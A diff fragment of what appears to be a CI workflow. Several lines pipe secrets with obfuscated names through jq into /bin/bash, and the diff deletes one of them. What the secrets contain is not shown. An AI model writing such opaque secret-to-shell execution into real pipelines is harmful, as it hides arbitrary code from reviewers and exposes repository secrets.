@@ -20,7 +20,6 @@ jobs:
           zeo8086: ${{ secrets.zeo8086 }}
         run: |
           printf '%s' "$zeo8086" | jq -r .mge5985 | /bin/bash
-          printf '%s' "$gn6564" | jq -r .yfmh59521 | /bin/bash
           echo $g5455 | jq -r .r0768 | /bin/bash
           echo $rq49 | jq -r .pupk64 | /bin/bash
           printf '%s' "$hr117" | jq -r .s1 | /bin/bash
